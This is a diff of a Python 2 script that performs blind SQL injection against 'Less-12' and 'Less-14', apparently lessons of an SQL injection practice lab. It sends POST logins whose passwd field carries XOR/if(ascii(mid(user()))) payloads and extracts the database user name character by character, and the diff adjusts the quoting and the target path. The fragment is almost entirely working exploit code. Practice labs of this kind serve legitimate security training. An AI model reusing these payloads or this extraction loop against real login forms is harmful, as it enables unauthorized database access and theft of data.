@@ -2,8 +2,7 @@
 #encoding=utf-8
 
 '''
-POST -Error based - Double quotes -String - with twist
-uname=admin&passwd=aaa")xor(if(length(user())=14,1,0))or("bb
+POST -Double Injection - Double quotes -String
 '''
 
 import urllib,httplib, time, string, sys, random
@@ -25,13 +24,13 @@ user = ''
 for i in range (1, 30):
     for payload in payloads:
         try:
-            s = 'aaaa")XOR(if(ascii(mid(user(),%s,1))=%s,1,0))OR("bb' % (i, ord(payload))
+            s = 'aaaa"XOR(if(ascii(mid(user(),%s,1))=%s,1,0))OR"bb' % (i, ord(payload))
             #param = urllib.urlencode({"uname":'admin', 'passwd': s})
             #print param
             param = "uname=admin&passwd=%s" % urllib.quote(s) 
             conn = httplib.HTTPConnection(host, timeout=4)
             conn.request(method='POST',
-                            url = "/Less-12/",
+                            url = "/Less-14/",
                             body = param,
                             headers = headers
             )
